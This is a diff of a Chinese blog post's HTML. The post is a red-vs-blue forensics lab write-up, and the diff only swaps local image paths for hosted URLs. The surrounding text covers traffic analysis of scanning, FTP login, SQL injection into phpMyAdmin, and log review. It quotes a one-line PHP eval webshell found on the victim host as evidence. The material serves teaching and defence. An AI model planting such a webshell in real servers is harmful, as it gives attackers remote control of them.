@@ -103,7 +103,7 @@
 &lt;li&gt;
 &lt;p&gt;&lt;strong&gt;虚拟机网络模式配置&lt;/strong&gt;：红蓝双方虚拟机均设置为“仅主机模式”，避免外部网络干扰，确保内网互通。&lt;br&gt;
 （Kali 网络适配器配置截图）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c1.png&#34;
 	
 	
 	
@@ -112,7 +112,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;（Windows Server 2019 网络适配器配置截图）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c2.png&#34;
 	
 	
 	
@@ -120,7 +120,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c3.png&#34;
 	
 	
 	
@@ -143,7 +143,7 @@
 &lt;li&gt;
 &lt;p&gt;&lt;strong&gt;连通性验证&lt;/strong&gt;：&lt;br&gt;
 蓝队通过 cmd 执行 &lt;code&gt;ping 172.3.200.20&lt;/code&gt;，红队通过终端执行 &lt;code&gt;ping 172.3.200.10&lt;/code&gt;，双方均显示 0% 丢包率，确认网络互通。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c4.png&#34;
 	
 	
 	
@@ -151,7 +151,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c5.png&#34;
 	
 	
 	
@@ -179,7 +179,7 @@
 筛选 SYN 扫描特征数据包。&lt;br&gt;
 分析结果显示：红队 IP（172.3.200.20）向蓝队 IP（172.3.200.10）的多个端口发送 SYN 请求，其中 80 端口（HTTP 服务）和 21 端口（FTP 服务）返回 SYN-ACK 响应，确认蓝方开放这两个关键服务，与红队扫描结果一致，证明红队实施了端口扫描攻击。&lt;br&gt;
 （蓝队 Wireshark 扫描结果截图）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c7.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c7.png&#34;
 	
 	
 	
@@ -193,7 +193,7 @@
 筛选 FTP 协议流量。&lt;br&gt;
 分析结果显示：捕获到红队发送的 FTP 登录请求数据包，用户名和密码均为 anonymous，且后续数据包显示 “Login successful” 响应，证明红队通过弱口令爆破成功登录 FTP 服务器。该流量证据直接验证了红队的 FTP 爆破行为。&lt;br&gt;
 （蓝队 Wireshark 捕获结果截图）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c9.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c9.png&#34;
 	
 	
 	
@@ -207,7 +207,7 @@
 筛选红队的 HTTP GET 请求。&lt;br&gt;
 分析结果显示：红队在短时间内发送大量 GET 请求，尝试访问 /dedecms 目录下的不同路径，其中包含 /dede（Dedecms 后台）、/phpmyadmin（数据库管理页）等敏感路径的访问请求，符合目录扫描的特征，证明红队实施了 Web 目录探测攻击。&lt;br&gt;
 （蓝队捕获 ffuf 目录扫描截图）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c13.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c13.png&#34;
 	
 	
 	
@@ -220,7 +220,7 @@
 &lt;code&gt;ip.addr == 172.3.200.20 and http.request.method == &amp;quot;POST&amp;quot; and http.host == &amp;quot;172.3.200.10/phpmyadmin&amp;quot;&lt;/code&gt;&lt;br&gt;
 筛选相关 POST 请求。&lt;br&gt;
 尽管部分流量被 Windows Defender 拦截，但通过威胁历史记录和后续文件验证，结合捕获到的 phpMyAdmin 访问流量，确认红队通过 POST 请求提交了 SQL 注入语句，成功写入恶意文件。在蓝方 web 目录下面成功找到 webshell.php。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c15.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c15.png&#34;
 	
 	
 	
@@ -228,7 +228,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c16.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c16.png&#34;
 	
 	
 	
@@ -242,7 +242,7 @@
 &lt;/h3&gt;&lt;p&gt;蓝队打开“事件查看器”（win+R 输入 &lt;code&gt;eventvwr.msc&lt;/code&gt;），展开“Windows 日志 → 安全”，筛选事件 ID 4624（登录成功事件）。&lt;br&gt;
 分析结果显示：存在来源 IP 为 172.3.200.20（红队）的登录记录，登录类型为 5（网络登录），登录时间与红队 FTP 爆破成功时间一致，由于红队采用匿名登录，用户名字段显示为“暂缺”。该日志证据验证了红队通过网络登录蓝队服务器的行为。&lt;br&gt;
 （事件查看器截图）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c17.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c17.png&#34;
 	
 	
 	
@@ -265,7 +265,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;筛选红队访问记录。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c18.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c18.png&#34;
 	
 	
 	
@@ -273,7 +273,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c19.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c19.png&#34;
 	
 	
 	
@@ -292,7 +292,7 @@
 &lt;/h2&gt;&lt;p&gt;文件证据是攻击方遗留的直接证据，通过查找恶意文件、验证文件内容和创建时间，可直接证明攻击行为的实施。本次实训的核心文件证据为红队写入的一句话木马文件。&lt;/p&gt;
 &lt;h3 id=&#34;341-恶意文件查找&#34;&gt;3.4.1 恶意文件查找
 &lt;/h3&gt;&lt;p&gt;蓝队根据流量分析和日志记录，定位 Web 系统根目录 &lt;code&gt;C:\xampp\htdocs\dedecms&lt;/code&gt;，在该目录下发现名为 &lt;code&gt;webshell.php&lt;/code&gt; 的可疑文件，该文件不在 Dedecms 默认文件列表中，疑似红队攻击遗留文件。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c20.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c20.png&#34;
 	
 	
 	
@@ -311,7 +311,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;确认该文件为一句话木马，攻击者可通过蚁剑等工具连接该文件，获取服务器控制权。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c21.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c21.png&#34;
 	
 	
 	
@@ -322,7 +322,7 @@
 &lt;h3 id=&#34;343-文件属性分析&#34;&gt;3.4.3 文件属性分析
 &lt;/h3&gt;&lt;p&gt;查看 &lt;code&gt;webshell.php&lt;/code&gt; 的属性信息：创建时间为 2025 年 12 月 10 日 21:51:17，与红队执行 SQL 写入 Shell 的时间（21:05 左右）高度吻合，时间差源于系统文件创建延迟和防御软件拦截时间。结合文件内容和创建时间，可直接证明该文件为红队攻击过程中写入的恶意文件。
 （文件属性截图）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c22.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c22.png&#34;
 	
 	
 	
@@ -334,7 +334,7 @@
 &lt;/h2&gt;&lt;p&gt;IP 溯源通过查询攻击方 IP 地址的相关信息，定位攻击源头，为追踪攻击者提供线索。本次实训中红队使用内网 IP，通过模拟公网 IP 溯源场景完成分析。&lt;/p&gt;
 &lt;h3 id=&#34;351-公网-ip-获取&#34;&gt;3.5.1 公网 IP 获取
 &lt;/h3&gt;&lt;p&gt;红队将 Kali Linux 虚拟机网络模式改为 NAT 模式，通过终端执行 &lt;code&gt;curl ifconfig.me&lt;/code&gt; 命令，获取公网 IP 地址为 &lt;code&gt;119.133.5.47&lt;/code&gt;。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c23.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c23.png&#34;
 	
 	
 	
@@ -344,7 +344,7 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;352-威胁情报查询&#34;&gt;3.5.2 威胁情报查询
 &lt;/h3&gt;&lt;p&gt;蓝队访问微步在线威胁情报平台（https://x.threatbook.cn/），输入红队公网 IP &lt;code&gt;119.133.5.47&lt;/code&gt; 进行查询，结果如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c24.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c24.png&#34;
 	
 	
 	
@@ -352,7 +352,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c25.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c25.png&#34;
 	
 	
 	
@@ -360,7 +360,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c26.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c26.png&#34;
 	
 	
 	
@@ -548,7 +548,7 @@ IP 溯源借助微步在线等权威威胁情报平台，数据来源可靠、�
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    netmask 255.255.0.0
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c27.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c27.png&#34;
 	
 	
 	
@@ -565,7 +565,7 @@ IP 溯源借助微步在线等权威威胁情报平台，数据来源可靠、�
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php @eval($_POST[&amp;#34;cmd&amp;#34;]);?&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c28.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://charles-lin-cell.github.io/%5c%5cimages%5c28.png&#34;
 	
 	
 	
